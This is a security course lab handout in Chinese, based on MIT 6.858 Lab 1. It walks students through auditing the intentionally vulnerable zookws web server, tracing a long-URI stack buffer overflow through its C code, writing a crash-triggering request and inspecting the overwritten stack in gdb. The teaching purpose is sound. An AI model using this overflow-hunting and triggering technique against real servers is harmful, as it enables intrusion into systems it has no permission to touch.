#缓冲区溢出2：分析与触发

###哈尔滨工业大学 网络与信息安全 张宇 2016

参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)

---

本节课中熟悉实验环境，分析一个Web服务器的逻辑，寻找缓冲区溢出漏洞并触发该漏洞。

## 实验预备

实验资料见[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

实验环境为Ubuntu，在VMware Player (VMware Fusion)虚拟机中运行。系统中有两个账号：

- `root`，口令6858，用来安装软件
- `httpd`，口令6858，运行Web服务器和实验程序

本课程实验研究一个web服务器`zookws`。该服务器上运行一个Python的web应用`zoobar`，用户之间转移一种称为“zoobars”的货币。



1. 在VMware里用`httpd`账号登录后，运行`ifconfig`查看IP地址
1. 用终端软件通过SSH登录系统`ssh httpd@IP地址`
1. 运行`scp lab1.zip httpd@IP地址`将实验程序拷贝到`/home/httpd`
2. 安装`unzip`程序，解压缩文件，并移动到`/home/httpd/lab`
3. `make`编译程序
4. 启动服务器`./clean-env.sh ./zookld zook-exstack.conf`
5. 用浏览器访问zook服务`http://虚拟机IP地址:8080/`

服务器端包含以下主要文件：

- `clean-env.sh`脚本令程序每次运行时栈和内存布局都相同
- `zookld.c`: 启动`zook.conf`中所配置服务，如`zookd`和`zookfs`
- `zookd.c`: 将HTTP请求路由到相应服务，如`zookfs`
- `zookfs.c`: 提供静态文件或执行动态代码服务
- `http.c`: HTTP实现
- `index.html`: Web服务器首页
- `/zoobar`目录：zoobar服务实现



```
              |     +—————————+   
              |     |zookld.c |<—— "zook-*.conf" 
              |     +———+—————+                 
              |         |——————————————+
              |         |              |         +—————————————+
+——————+    HTTP    +———v———+      +———v————+    |CGI, Database|
|client| <====|===> |zookd.c|<————>|zookfs.c|———>|"/zoobar"    |
+——————+      |     +———^———+      +———^————+    +—————————————+ 
              |         |              | (2) http_request_headers()
(1) http_request_line() |   +——————+   | (3) http_serve()
              |         +———|http.c|———+
              |             +——————+
```


服务器端采用CGI (Common Gateway Interface)技术，将客户端请求URL映射到脚本或者普通HTML文件。CGI脚本可以由任意程序语言实现，脚本只需将HTTP头部和HTML文档输出到标准输出。本例CGI由`/zoobar`目录中的python脚本实现，其中也包含一个数据库。目前，我们不需要关心具体zoobar服务内容。

`zookd`和`zookfs`执行程序分别有两个版本：

- `*-exstack`版本有可执行的栈，将攻击代码注入到栈中缓冲区
- `*-nxstack`版本的栈不可执行，需要用其他技术来运行攻击代码

查看一下被启动的程序：

``` sh
$ ps -fp $(pgrep zook)
UID        PID  PPID  C STIME TTY      STAT   TIME CMD
httpd     4448  2493  0 15:44 pts/3    S+     0:00 /home/httpd/lab/zookld zook-exstack.conf
httpd     4453  4448  0 15:44 pts/3    S+     0:00 zookd-exstack 5
httpd     4454  4448  0 15:44 pts/3    S+     0:00 zookfs-exstack 6
```

服务器采用这一架构的原因会在之后的课程中学习。

---

##HTTP简介

参考资料：[How the web works: HTTP and CGI explained](supplyments/How-the-web-works.pdf)

HTTP请求格式：

```
[METH] [REQUEST-URI] HTTP/[VER]
Field1: Value1
Field2: Value2

[request body, if any]
```
HTTP请求例子：

```
GET / HTTP/1.0
User-Agent: Mozilla/3.0 (compatible; Opera/3.0; Windows 95/NT4)
Accept: */*
Host: birk105.studby.uio.no:81
```

HTTP应答格式：

```
HTTP/[VER] [CODE] [TEXT]
Field1: Value1
Field2: Value2

...Document content here...
```
HTTP应答例子：

```
HTTP/1.0 200 OK
Server: Netscape-Communications/1.1
Date: Tuesday, 25-Nov-97 01:22:04 GMT
Last-modified: Thursday, 20-Nov-97 10:44:53 GMT
Content-length: 6372
Content-type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
...followed by document content...
```

---

### 寻找漏洞

缓冲区溢出存在的要素：数组（字符串），串处理/读取函数（写操作）。

数组：`char * s`, `char s[128]`, `int a[128]`, `void * p`。

函数： `strcpy()`, `strcat()`, `sprintf()`, `vsprintf()`, `gets()`, `getc()`, `read()`, `scanf()`, `getenv()`。

除了调用函数外，还可能通过`for/while {}`循环的方式来访问缓冲区。

在源码中搜索一个‘危险’函数`strcpy()`。

``` c
$ grep -n 'strcpy' *.c
http.c:344:    strcpy(dst, dirname);
```
在`http.c`中找到了一处潜在漏洞，来具体看一下代码。

``` c
void dir_join(char *dst, const char *dirname, const char *filename) {
    strcpy(dst, dirname);
    if (dst[strlen(dst) - 1] != '/')
        strcat(dst, "/");
    strcat(dst, filename);
}
```

`dir_join()`函数将`dirname`和`filename`先后拷贝到`dst`中。显然，这里并没有检查每一个字符串长度。若`dirname`长度比`dst`缓冲长，则`strcpy()`调用存在缓冲区溢出风险。

进一步检查使用`dir_join()`时是否存在导致缓冲区溢出的可能：

``` c
void http_serve_directory(int fd, const char *pn) {
    /* for directories, use index.html or similar in that directory */
    static const char * const indices[] = {"index.html", "index.php", "index.cgi", NULL};
    char name[1024];
    struct stat st;
    int i;

    for (i = 0; indices[i]; i++) {
        dir_join(name, pn, indices[i]);
        if (stat(name, &st) == 0 && S_ISREG(st.st_mode)) {
            dir_join(name, getenv("SCRIPT_NAME"), indices[i]);
            break;
        }
    }

    if (indices[i] == NULL) {
        http_err(fd, 403, "No index file in %s", pn);
        return;
    }

    http_serve(fd, name);
}
```
在`dir_join(name, pn, indices[i]);`调用中，`char name[]`长度为1024。`char * pn`长度待定，继续查看`http_serve_directory()`调用情况。

``` c
void http_serve(int fd, const char *name)
{
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name);
    split_path(pn);

    if (!stat(pn, &st))
    {
        /* executable bits -- run as CGI script */
        if (valid_cgi_script(&st))
            handler = http_serve_executable;
        else if (S_ISDIR(st.st_mode))
            handler = http_serve_directory;
        else
            handler = http_serve_file;
    }

    handler(fd, pn);
}
```
`handler = http_serve_directory`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。

``` c
zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
```
该环境变量在`http.c`中`http_request_line()`函数中被设置。

``` c
http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
```

在`zookd.c`中，`http_request_line()`函数被`process_client()`函数调用。

```
zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
```

我们把这一漏洞命名为“LONG_URI”漏洞，回顾分析过程如下：

``` c
http.c:344:    strcpy(dst, dirname) // dst size = ?
|                                  //  |
dir_join(name, pn, indices[i]);   // name size = 1024
|                                //  |
handler(fd, pn);                // pn size = 1024
|
zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
|      
http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
|
zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
```
---
## 触发漏洞

首先，该漏洞必须能改写栈中的一个返回地址；其次，改写一些数据结构来用于夺取程序的控制流。撰写触发该漏洞的程序，并验证改程序可以导致web服务器崩溃（通过`dmesg | tail`, 使用`gdb`, 或直接观察）。

漏洞利用程序模板为`exploit-template.py`，该程序向服务器发送特殊请求。

首先启动服务：`./clean-env.sh ./zookld zook-exstack.conf`。
下面是是未改写的`exploit-template.py`执行结果。

``` html
$ ./exploit-template.py 127.0.0.1 8080
HTTP request:
GET / HTTP/1.0       <-- 客户端请求：方法，URL，HTTP版本号

Connecting to 127.0.0.1:8080...
Connected, sending request...
Request sent, waiting for reply...
Received reply.
HTTP response:
HTTP/1.0 200 OK      <-- HTTP版本号，状态代码
<html>               <-- 文档
<head>
  <meta http-equiv="refresh" content="0; URL=zoobar/index.cgi/" />
</head>
<body>
  <a href="zoobar/index.cgi/">Click here</a>
</body>
</html>
```
我们发现了可由我们控制的用户输入，客户端请求位于下面代码中： 

``` python
## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req =   "GET / HTTP/1.0\r\n" + \
            "\r\n"
    return req
```

目前，我们手上有了两个攻击服务器的武器：(1) “LONG_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。

通过分析代码可以发现，HTTP请求中的路径，例如`/foo.html`，被赋予了`REQUEST_URI`变量，因此可以通过构造较长的HTTP请求路径来令缓冲区溢出。
下面的代码有删节。

``` c
const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
{
    static char buf[8192];      /* static variables are not on the stack */
    char *sp1, *sp2, *qp, *envp = env;
    //  ... ... 
    if (http_read_line(fd, buf, sizeof(buf)) < 0)
        return "Socket IO error";

    /* Parse request like "GET /foo.html HTTP/1.0" */
    sp1 = strchr(buf, ' ');
    if (!sp1)
        return "Cannot parse HTTP request (1)";
    *sp1 = '\0';
    sp1++;
    if (*sp1 != '/')
        return "Bad request path";
    sp2 = strchr(sp1, ' ');
    if (!sp2)
        return "Cannot parse HTTP request (2)";
    *sp2 = '\0';
    sp2++;
    //  ... ...
    /* decode URL escape sequences in the requested path into reqpath */
    url_decode(reqpath, sp1);
    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
    //  ... ...
}
```

之前发现缓冲区有1024字节，我们就令请求路径超过1024字节。

``` python
 req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
            "\r\n"
```
将攻击脚本复制两份，命名为`exploit-2a.py`和`exploit-2b.py`，并用`make check-crash`来验证是否导致程序崩溃。

``` sh
$ make check-crash
./check-bin.sh
./check-part2.sh zook-exstack.conf ./exploit-2a.py
./check-part2.sh: line 8:  4398 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4417  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4417  +++ killed by SIGSEGV +++
PASS ./exploit-2a.py
./check-part2.sh zook-exstack.conf ./exploit-2b.py
./check-part2.sh: line 8:  4423 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4442  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4442  +++ killed by SIGSEGV +++
PASS ./exploit-2b.py
```

该程序并通过(PASS)了检查。缓冲区漏洞导致程序因为SIGSEV信号而崩溃，指令地址被改写为`si_addr=0x41414141`。下面看看具体发生了什么。

使用`gdb -p 进程号`来调试程序。进程号可通过两种方法获得：观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。

使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的子进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。

当生成子进程时，`gdb`缺省情况下仍然调试父进程，而不会跟踪子进程。由于`zookfs`为每个服务请求生成一个子进程，为了自动跟踪子进程，使用`set follow-fork-mode child`命令。该命令已经被加入`/home/httpd/lab/.gdbinit`中，`gdb`启动时会自动执行。

调试流程如下：

1. 在终端1中，重启服务：
`$ ./clean-env.sh ./zookld zook-exstack.conf`。
1. 在终端2中，启动`gdb`（`gdb -p PID`），并设置断点（`b`命令）。
1. 在终端3中，运行漏洞触发程序 `./exploit-2a.py localhost 8080`。
1. 返回终端2，继续调试（`c`命令）。

首先，调试`zookd`。`http_request_line`负责处理HTTP请求。

``` gas
$ gdb -p $(pgrep zookd-exstack)
...
(gdb) b http_request_line
Breakpoint 1 at 0x8049150: file http.c, line 67.
[运行漏洞触发程序]
(gdb) c
Continuing.

Breakpoint 1, http_request_line (fd=5, reqpath=0xbfffee08 "", env=0x804e520 <env> "", env_len=0x8050520 <env_len>) at http.c:67
warning: Source file is more recent than executable.
67          char *sp1, *sp2, *qp, *envp = env; 
(gdb) n
[执行n多次直到REQUEST_URI被处理完]
(gdb) n
109         envp += sprintf(envp, "SERVER_NAME=zoobar.org") + 1;
(gdb) x/10 buf        [打印buf，请求中各字段已经被分割]
0x8050540 <buf.4435>:   "GET"
0x8050544 <buf.4435+4>: "/", 'A' <repeats 199 times>...
0x805060c <buf.4435+204>:       'A' <repeats 200 times>...
0x80506d4 <buf.4435+404>:       'A' <repeats 200 times>...
0x805079c <buf.4435+604>:       'A' <repeats 200 times>...
0x8050864 <buf.4435+804>:       'A' <repeats 200 times>...
0x805092c <buf.4435+1004>:      'A' <repeats 25 times>
0x8050946 <buf.4435+1030>:      "HTTP/1.0"
0x805094f <buf.4435+1039>:      ""
0x8050950 <buf.4435+1040>:      ""
(gdb) x/10 reqpath    [打印reqpath，为"/", A * 1024]
0xbfffee08:     "/", 'A' <repeats 199 times>...
0xbfffeed0:     'A' <repeats 200 times>...
0xbfffef98:     'A' <repeats 200 times>...
0xbffff060:     'A' <repeats 200 times>...
0xbffff128:     'A' <repeats 200 times>...
0xbffff1f0:     'A' <repeats 25 times>
0xbffff20a:     "\005\b|\365\377\277"
0xbffff211:     ""
0xbffff212:     ""
0xbffff213:     ""
(gdb) p sizeof reqpath  [reqpath不会溢出]
$3 = 2048
(gdb) p sizeof env      [env不会溢出]
$4 = 8192
[继续用n命令执行]
85          if (sendfd(svcfds[i], env, env_len, fd) <= 0)
[此时zookd将请求发送给zookfs]
(gdb) quit
```

`zookd`此时并不存在缓冲区溢出，接下来分析`zookfs`。

在`zookfs.c`中，`http_serve()`函数以`REQUEST_URI`环境变量为参数。在`http_serve`处设置断点，分析栈结构。

``` gas
$ gdb -p $(pgrep zookfs-exstack)
...
(gdb) b http_serve
Breakpoint 1 at 0x804951c: file http.c, line 275.
[运行漏洞触发程序]
(gdb) c
Continuing.
[New process 5076]
[Switching to process 5076]

Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
warning: Source file is more recent than executable.
275         void (*handler)(int, const char *) = http_serve_none;
(gdb) p $ebp
$1 = (void *) 0xbfffde08
(gdb) p &handler
$2 = (void (**)(int, const char *)) 0xbfffddfc
(gdb) p &pn
$3 = (char (*)[1024]) 0xbfffd9fc
(gdb) p &st
$4 = (struct stat *) 0xbfffd9a4
(gdb) p &fd
$5 = (int *) 0xbfffde10
(gdb) P &name
$6 = (const char **) 0xbfffde14
(gdb) x $ebp+4
0xbfffde0c:     0x08048d86
```

根据上面的调试信息绘制`http_serve()`的栈结构：

```
+———————————————————————-+   
|          name          |<——— (+12)   =0xbfffde14       
+———————————————————————-+   
|        fd = 3          |<——— (+8)    =0xbfffde10                                  
+———————————————————————-+                                 
|     return address     |<——— (+4)    =0xbfffde0c 
+———————————————————————-+                             
|          ebp           |<——— (0)     =0xbfffde08
+———————————————————————-+
|                        |
+————————————————————————+
|    void (*handler)     |<——— (-12)   =0xbfffddfc
+————————————————————————+
|pn[1023]   ^            |
|           |            |
|           |       pn[0]|<——— (-1036) =0xbfffd9fc
+————————————————————————+
|    struct stat st      | 
|       (88bytes)        |<——— (-1124) =0xbfffd9a4
+———————————————————————-+

```

继续执行到`strcat()`，

``` gas
(gdb) n
279         getcwd(pn, sizeof(pn));
(gdb) n
280         setenv("DOCUMENT_ROOT", pn, 1);
(gdb) n
282         strcat(pn, name);
(gdb) p pn
$7 = "/home/httpd/lab\000", 'A' <repeats 504 times>...
(gdb) p strlen(name)
$8 = 1025
(gdb) p sizeof pn
$9 = 1024
```

此处将执行`strcat()`，在`pn`中已经包含的来自`getcwd()`的字符串后面加上长度1025的`name`，将超过`pn`所分配的大小1024，导致缓冲区溢出。接着执行一步，并查看缓冲区溢出情况。

``` gas
(gdb) n
283         split_path(pn);
(gdb) x/10s pn
0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
0xbfffdac4:     'A' <repeats 200 times>...
0xbfffdb8c:     'A' <repeats 200 times>...
0xbfffdc54:     'A' <repeats 200 times>...
0xbfffdd1c:     'A' <repeats 200 times>...
0xbfffdde4:     'A' <repeats 40 times>
0xbfffde0d:     "\215\004\b\003"
0xbfffde12:     ""
0xbfffde13:     ""
0xbfffde14:     "\264\020\005\b"
(gdb) x &handler
0xbfffddfc:     'A' <repeats 16 times>
(gdb) x $ebp
0xbfffde08:     "AAAA"
(gdb) x $ebp+4
0xbfffde0c:     ""

```

在`pn`之前的缓冲区，包括`handler`和`$ebp`，已经被字符`A`覆盖，但返回地址并没有被完全改写。该如何改写?

``` gas
(gdb) n
285         if (!stat(pn, &st))
(gdb) n
296         handler(fd, pn);
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) bt
#0  0x41414141 in ?? ()
#1  0x080495e8 in http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:296
#2  0x08048d00 in main (argc=<error reading variable: Cannot access memory at address 0x41414149>,
    argv=<error reading variable: Cannot access memory at address 0x4141414d>) at zookfs.c:39
```

继续执行到`handler(fd, pn);`，由于`handler`变量被改写为`0x41414141`，导致程序崩溃。这发生在先前发现的`strcpy()`漏洞之前。这个示例并没有利用改写返回地址来劫持控制流。

---

## 作业：寻找并触发漏洞

实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

寻找并触发2个新的缓冲区溢出漏洞，详细描述漏洞并触发过程。

改写漏洞利用模板`exploit-template.py`，将两个漏洞利用程序分别命名为`exploit-2a.py`和`exploit-2b.py`。最后，用`make check-crash`命令来验证是否能够令服务器崩溃。

**提示**：HTTP请求中不只包括URL。












